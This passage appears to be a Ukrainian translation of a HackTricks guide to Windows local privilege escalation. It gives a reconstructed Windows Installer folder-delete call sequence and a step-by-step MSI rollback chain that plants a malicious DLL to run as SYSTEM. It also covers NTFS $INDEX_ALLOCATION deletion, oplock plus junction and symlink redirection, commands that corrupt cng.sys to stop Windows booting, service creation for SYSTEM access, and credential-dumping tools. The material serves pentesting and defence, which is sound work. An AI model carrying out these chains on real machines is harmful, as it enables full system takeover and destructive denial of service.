Після `MsiBeginTransactionW` функція `SetEEUIDirectoryAndFilter` додає шлях до списку на очищення як папку, незалежно від аргументу фільтра, переданого викликачем. Служба створює іменоване значення `REG_DWORD` у `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: ім’я значення — це контрольований викликачем шлях, а дані `0x00000002` — прапорець папки. Далі `CleanupTempPackages(NULL, FALSE)` безпосередньо запускає очищення. Її привілейований робочий потік перераховує значення реєстру й передає записи папок рекурсивній функції `FDeleteFolder`, не перевіряючи походження шляхів. Якщо звичайне видалення не вдається, код також викликає `LockdownPath`, скидає атрибути файлу й повторює спробу.<sup>[[41]](#references)</sup>

Мінімальна послідовність викликів, відновлена з `msi.dll`:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Корисний примітив — повторне використання шляху, а не перенаправлення через junction. Зареєструйте створений атакувальником `C:\Config.Msi`, видаліть його та дочекайтеся, поки Windows Installer згодом знову створить цей самий шлях із захищеними даними відкату. Під час очищення довіряє застарілому імені `TempPackages` і видаляє нову директорію з правами SYSTEM. Це дає змогу обійти передбачений захист на основі `FILE_FLAG_OPEN_REPARSE_POINT` і пом’якшення, що довіряє перенаправленню, оскільки reparse point не потрібен.<sup>[[41]](#references)</sup>

Цей примітив видалення можна використати в наведеному нижче ланцюжку відкату: зберегти окремий запис `Installer\Folders`, видалити захищену `C:\Config.Msi`, створити її заново з NULL DACL і зберегти handle з правом `WRITE_DAC`, відкритий до того, як інсталятор захистить DACL. Заздалегідь відкритий handle може відновити дозвільну DACL за допомогою `NtSetSecurityObject`, після чого згенерований `.rbs` можна замінити до відновлення процесу відкату.<sup>[[41]](#references)</sup>

Microsoft усунула проблему, заборонивши `CMsiTransaction::SetEEUIDirectoryAndFilter` викликати `ScheduleFileOrFolderDelete`, коли ввімкнено новий feature gate. COM-виклик усе ще може повернути успіх, але шлях, контрольований атакувальником, більше не додається до `TempPackages`. Застосуйте оновлення безпеки Windows за квітень 2025 року, а не використовуйте успішне повернення методу як перевірку виправлення.<sup>[[41]](#references)[[42]](#references)</sup>

Узагальнений опис техніки:

1. **Етап 1 — Підготовка до перехоплення (залиште `C:\Config.Msi` порожньою)**

- Крок 1: Установіть MSI
    - Створіть `.msi`, який встановлює нешкідливий файл (наприклад, `dummy.txt`) у доступну для запису папку (`TARGETDIR`).
    - Позначте інсталятор як **"UAC Compliant"**, щоб його міг запустити **користувач без прав адміністратора**.
    - Після встановлення залиште відкритим **handle** до файлу.

- Крок 2: Почніть видалення
    - Видаліть той самий `.msi`.
    - Процес видалення починає переміщувати файли до `C:\Config.Msi` і перейменовувати їх на файли `.rbf` (резервні копії для відкату).
    - **Перевіряйте відкритий handle** за допомогою `GetFinalPathNameByHandle`, щоб визначити, коли шлях до файлу стане `C:\Config.Msi\<random>.rbf`.

- Крок 3: Синхронізація
    - `.msi` містить **користувацьку дію видалення (`SyncOnRbfWritten`)**, яка:
        - Сигналізує, коли файл `.rbf` записано.
        - Потім **очікує** на іншу подію, перш ніж продовжити видалення.

- Крок 4: Заблокуйте видалення `.rbf`
    - Після отримання сигналу **відкрийте файл `.rbf`** без `FILE_SHARE_DELETE` — це **заборонить його видалення**.
    - Потім **надішліть сигнал у відповідь**, щоб видалення могло завершитися.
    - Windows Installer не може видалити файл `.rbf`, а оскільки він не може видалити весь вміст, **`C:\Config.Msi` не видаляється**.

- Крок 5: Видаліть `.rbf` вручну
    - Ви (атакувальник) вручну видаляєте файл `.rbf`.
    - Тепер **`C:\Config.Msi` порожня** і готова до перехоплення.

> На цьому етапі **використайте вразливість довільного видалення папки з рівнем SYSTEM**, щоб видалити `C:\Config.Msi`.

2. **Етап 2 — Заміна скриптів відкату на шкідливі**

- Крок 6: Створіть `C:\Config.Msi` заново зі слабкими ACL
    - Створіть папку `C:\Config.Msi` заново.
    - Установіть **слабкі DACL** (наприклад, Everyone:F) і **залиште відкритим handle** із правом `WRITE_DAC`.

- Крок 7: Запустіть інше встановлення
    - Знову встановіть `.msi`, задавши:
        - `TARGETDIR`: доступне для запису розташування.
        - `ERROROUT`: змінну, яка спричиняє примусову помилку.
    - Це встановлення використаємо, щоб знову запустити **відкат**, який читає `.rbs` і `.rbf`.

- Крок 8: Відстежуйте появу `.rbs`
    - Використовуйте `ReadDirectoryChangesW`, щоб відстежувати `C:\Config.Msi`, доки там не з’явиться новий `.rbs`.
    - Збережіть його ім’я.

- Крок 9: Синхронізуйтеся перед відкатом
    - `.msi` містить **користувацьку дію встановлення (`SyncBeforeRollback`)**, яка:
        - Сигналізує про створення `.rbs`.
        - Потім **очікує**, перш ніж продовжити.

- Крок 10: Повторно застосуйте слабкі ACL
    - Після отримання події `створено .rbs`:
        - Windows Installer **повторно застосовує суворі ACL** до `C:\Config.Msi`.
        - Але оскільки у вас усе ще є handle із правом `WRITE_DAC`, ви можете **знову застосувати слабкі ACL**.

> ACL **перевіряються лише під час відкриття handle**, тож ви все ще можете записувати до папки.

- Крок 11: Розмістіть підроблені `.rbs` і `.rbf`
    - Перезапишіть файл `.rbs` **підробленим скриптом відкату**, який вказує Windows:
        - Відновити ваш файл `.rbf` (шкідливу DLL) у **привілейоване розташування** (наприклад, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Розмістіть підроблений `.rbf` зі **шкідливою DLL-навантаженням рівня SYSTEM**.

- Крок 12: Запустіть відкат
    - Надішліть сигнал події синхронізації, щоб інсталятор продовжив роботу.
    - **Користувацьку дію типу 19 (`ErrorOut`)** налаштовано так, щоб вона **навмисно завершила встановлення помилкою** у визначений момент.
    - Це запускає **відкат**.

- Крок 13: SYSTEM установлює вашу DLL
    - Windows Installer:
        - Читає ваш шкідливий `.rbs`.
        - Копіює вашу DLL із `.rbf` у цільове розташування.
    - Тепер ваша **шкідлива DLL розміщена за шляхом, звідки її завантажує SYSTEM**.

- Завершальний крок: Виконайте код із правами SYSTEM
    - Запустіть довірений **автоматично підвищений бінарний файл** (наприклад, `osk.exe`), який завантажує перехоплену DLL.
    - **Готово**: ваш код виконується **з правами SYSTEM**.


### Від довільного видалення/переміщення/перейменування файлів до SYSTEM EoP

Основна техніка відкату MSI (описана вище) передбачає, що ви можете видалити **цілу папку** (наприклад, `C:\Config.Msi`). Але що, якщо ваша вразливість дає змогу лише **довільно видаляти файли**?

Можна використати **внутрішні механізми NTFS**: кожна папка має прихований альтернативний потік даних із назвою:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Цей потік зберігає **метадані індексу** папки.

Тому, якщо **видалити потік `::$INDEX_ALLOCATION` папки**, NTFS **видалить усю папку** з файлової системи.

Це можна зробити за допомогою стандартних API для видалення файлів, наприклад:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Хоча ви викликаєте API для видалення *файлу*, він **видаляє саму папку**.

### Від видалення вмісту папки до SYSTEM EoP
Що, якщо ваш примітив не дозволяє видаляти довільні файли/папки, але **дозволяє видаляти *вміст* папки, контрольованої атакувальником**?

1. Крок 1: Створіть папку-приманку та файл
- Створіть: `C:\temp\folder1`
- Усередині неї: `C:\temp\folder1\file1.txt`

2. Крок 2: Установіть **oplock** на `file1.txt`
- **oplock** **призупиняє виконання**, коли привілейований процес намагається видалити `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Крок 3: Запустіть процес SYSTEM (наприклад, `SilentCleanup`)
- Цей процес сканує папки (наприклад, `%TEMP%`) і намагається видалити їхній вміст.
- Коли він доходить до `file1.txt`, **спрацьовує oplock** і передає керування вашому callback.

4. Крок 4: Усередині callback oplock — перенаправте видалення

- Варіант A: Перемістіть `file1.txt` в інше місце
    - Це очистить `folder1`, не порушивши oplock.
    - Не видаляйте `file1.txt` напряму — це передчасно звільнить oplock.

- Варіант B: Перетворіть `folder1` на **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Опція C: Створіть **symlink** у `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Цей метод націлений на внутрішній потік NTFS, у якому зберігаються метадані папки, — його видалення видаляє папку.

5. Крок 5: Звільнення oplock
- Процес SYSTEM продовжує роботу й намагається видалити `file1.txt`.
- Але тепер через junction + symlink він фактично видаляє:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Результат**: `C:\Config.Msi` видаляється від імені SYSTEM.

### Від створення папки в довільному місці до постійного DoS

Використайте примітив, який дає змогу **створити довільну папку від імені SYSTEM/admin** — навіть якщо **ви не можете записувати файли** або **встановлювати слабкі дозволи**.

Створіть **папку** (не файл) з назвою **критично важливого драйвера Windows**, наприклад:
```
C:\Windows\System32\cng.sys
```

- Цей шлях зазвичай відповідає драйверу режиму ядра `cng.sys`.
- Якщо **заздалегідь створити його як папку**, Windows не зможе завантажити справжній драйвер під час запуску.
- Після цього Windows намагатиметься завантажити `cng.sys` під час запуску.
- Вона побачить папку, **не зможе знайти справжній драйвер** і **аварійно завершить роботу або зупинить завантаження**.
- **Резервного варіанта немає**, і **відновлення неможливе** без зовнішнього втручання (наприклад, відновлення завантаження або доступу до диска).

### Від привілейованих шляхів журналів/резервних копій і OM symlinks до довільного перезапису файлів / boot DoS

Якщо **привілейована служба** записує журнали/експорти за шляхом, узятим із **доступної для запису конфігурації**, перенаправте цей шлях за допомогою **Object Manager symlinks + NTFS mount points**, щоб перетворити привілейований запис на довільний перезапис (навіть **без** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Вимоги**
- Конфігурація, у якій зберігається цільовий шлях, доступна зловмиснику для запису (наприклад, `%ProgramData%\...\.ini`).
- Можливість створити mount point до `\RPC Control` і OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Привілейована операція, яка записує за цим шляхом (журнал, експорт, звіт).

**Приклад ланцюжка**
1. Прочитайте конфігурацію, щоб визначити шлях до привілейованого журналу, наприклад `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` у `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Перенаправте шлях без прав адміністратора:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Дочекайтеся, поки привілейований компонент запише журнал (наприклад, адміністратор натисне «надіслати тестове SMS»). Тепер запис потрапить у `C:\Windows\System32\cng.sys`.
4. Перевірте перезаписаний файл (за допомогою hex/PE-парсера), щоб підтвердити пошкодження; перезавантаження змушує Windows завантажити підмінений драйвер → **DoS через цикл перезавантаження**. Цей підхід також можна застосувати до будь-якого захищеного файла, який привілейована служба відкриє для запису.

> `cng.sys` зазвичай завантажується з `C:\Windows\System32\drivers\cng.sys`, але якщо копія є в `C:\Windows\System32\cng.sys`, спочатку може бути використана саме вона, що робить цей файл надійною ціллю для DoS за допомогою пошкоджених даних.



## **Від High Integrity до System**

### **Нова служба**

Якщо ви вже працюєте в процесі з рівнем High Integrity, шлях до **SYSTEM** може бути простим: достатньо **створити й запустити нову службу**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Під час створення бінарного файлу служби переконайтеся, що це дійсна служба або що бінарний файл швидко виконує необхідні дії, оскільки його буде завершено через 20 с, якщо це не дійсна служба.

### AlwaysInstallElevated

З процесу з High Integrity можна спробувати **увімкнути записи реєстру AlwaysInstallElevated** і **встановити** reverse shell за допомогою обгортки _**.msi**_.\
[Більше інформації про задіяні ключі реєстру та встановлення пакета _.msi_ тут.](#alwaysinstallelevated)

### High + привілей SeImpersonate до System

**Ви можете** [**знайти код тут**](seimpersonate-from-high-to-system.md)**.**

### Від SeDebug + SeImpersonate до привілеїв Full Token

Якщо у вас є ці привілеї токена (імовірно, ви знайдете їх у вже запущеному процесі з High Integrity), ви зможете **відкрити майже будь-який процес** (крім захищених процесів) за допомогою привілею SeDebug, **скопіювати токен** процесу та створити **довільний процес із цим токеном**.\
Зазвичай для цієї техніки **вибирають будь-який процес, запущений від SYSTEM з усіма привілеями токена** (_так, можна знайти процеси SYSTEM без усіх привілеїв токена_).\
**Приклад коду, що виконує запропоновану техніку, можна знайти** [**тут**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Цю техніку meterpreter використовує для підвищення привілеїв у `getsystem`. Вона полягає у **створенні pipe, а потім створенні/зловживанні службою, щоб вона записувала в цей pipe**. Тоді **сервер**, який створив pipe за допомогою привілею **`SeImpersonate`**, зможе **імперсонувати токен** клієнта pipe (служби) й отримати привілеї SYSTEM.\
Щоб [**дізнатися більше про name pipes, прочитайте це**](#named-pipe-client-impersonation).\
Приклад [**переходу від High Integrity до System за допомогою name pipes можна знайти тут**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Якщо вам вдасться **перехопити dll**, яку **завантажує** **процес**, запущений від **SYSTEM**, ви зможете виконати довільний код із цими дозволами. Отже, Dll Hijacking також корисний для такого підвищення привілеїв і, до того ж, його **набагато легше здійснити з процесу з High Integrity**, оскільки він матиме **дозволи на запис** у папки, звідки завантажуються dll.\
**Дізнатися більше про Dll hijacking можна** [**тут**](dll-hijacking/index.html)**.**

### **Від Administrator або Network Service до System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Від LOCAL SERVICE або NETWORK SERVICE до повних привілеїв

**Читайте:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Додаткова допомога

[Статичні бінарні файли impacket](https://github.com/ropnop/impacket_static_binaries)

## Корисні інструменти

**Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Перевірка неправильних конфігурацій і конфіденційних файлів (**[**дивіться тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Виявляється.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Перевірка деяких можливих неправильних конфігурацій і збір інформації (**[**дивіться тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Перевірка неправильних конфігурацій**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Витягує збережену інформацію про сеанси PuTTY, WinSCP, SuperPuTTY, FileZilla і RDP. Використовуйте -Thorough локально.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Витягує облікові дані з Credential Manager. Виявляється.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Перевірка зібраних паролів у домені методом password spraying**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh — це інструмент PowerShell для підміни ADIDNS/LLMNR/mDNS і атак «людина посередині».**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Базова розвідка Windows для privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Пошук відомих вразливостей privesc (ЗАСТАРІЛИЙ, замість нього використовуйте Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Локальні перевірки **(потрібні права адміністратора)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Пошук відомих вразливостей privesc (потрібно скомпілювати за допомогою VisualStudio) ([**скомпільована версія**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Перевірка хоста на наявність неправильних конфігурацій (радше інструмент для збору інформації, ніж privesc) (потрібно скомпілювати) **(**[**скомпільована версія**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Витягує облікові дані з багатьох програм (скомпільований exe є на github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Порт PowerUp на C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Перевірка неправильних конфігурацій (скомпільований executable є на github). Не рекомендовано. Погано працює у Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Перевірка можливих неправильних конфігурацій (exe на Python). Не рекомендовано. Погано працює у Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Інструмент, створений на основі цієї публікації (для належної роботи йому не потрібен accesschk, але він може його використовувати).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Зчитує результат **systeminfo** і рекомендує працездатні експлойти (локальний Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Зчитує результат **systeminfo** і рекомендує працездатні експлойти (локальний Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Проєкт потрібно скомпілювати за допомогою правильної версії .NET ([дивіться тут](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Щоб переглянути встановлену на хості жертви версію .NET, можна виконати:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Основи підвищення привілеїв у Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Підвищення привілеїв через експлуатацію слабких дозволів на папки](http://www.greyhathacker.net/?p=738)
- [3] [Підвищення привілеїв у Windows — шпаргалка](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop — практикум із локального підвищення привілеїв у Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 — атаки на Windows: AT — новий хіт (Rob Fuller і Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Підвищення привілеїв у Windows — повний посібник з OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows — підвищення привілеїв — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Посібник із підвищення привілеїв у Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Контрольний список із підвищення привілеїв у Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Підвищення привілеїв у Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Методи підвищення привілеїв у Windows для пентестерів](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf — HTB/VulnLab JobTwo: фішинг через макрос Word VBA і SMTP → розшифрування облікових даних hMailServer → Veeam CVE-2023-27532 до SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) і викрадення kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research — переслідуючи Silver Fox: гра в кішки-мишки в тінях ядра](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 — уразливість файлової системи з підвищеними привілеями в системі SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Інструменти для тестування символічних посилань — використання CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Повернення в минуле: зловживання символічними посиланнями у Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn — MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (порт BOF для Cobalt Strike)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI — Node.js: небезпечне визначення модулів у Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Модулі Node.js: завантаження з папок `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits — розв’язання завдань контрольного списку C/C++](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn — функція RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery — NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone — CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone — перехоплення бінарних файлів служб](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own із Microslop: об’єднання CLDFLT і гонок у ядрі DirectX для локального підвищення привілеїв у Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Одного I/O Ring достатньо: повноцінний примітив для читання/запису у Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Зловживання довільним видаленням файлів для підвищення привілеїв та інші корисні прийоми](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC — код експлойтів FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure — атаки на WSUS, частина 2: CVE-2020-1013, локальне підвищення привілеїв у Windows 10 у день розкриття](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: вивчення Credential Manager і Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n — PoC для CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com — делегування Kerberos Resource Based Constrained Delegation: як зміна образу призводить до підвищення привілеїв](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com — вилучення приватних ключів SSH з агента SSH у Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps — перетворення серверів корпоративних оновлень на фабрики бекдорів (0_o) — частина 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps — перетворення серверів корпоративних оновлень на фабрики бекдорів (0_o) — частина 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s — NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence — підвищення привілеїв через видалення папки Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center — CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec — повне відновлення: повернення до NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group — рекомендації щодо підвищення привілеїв через зсуви спільної пам’яті Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
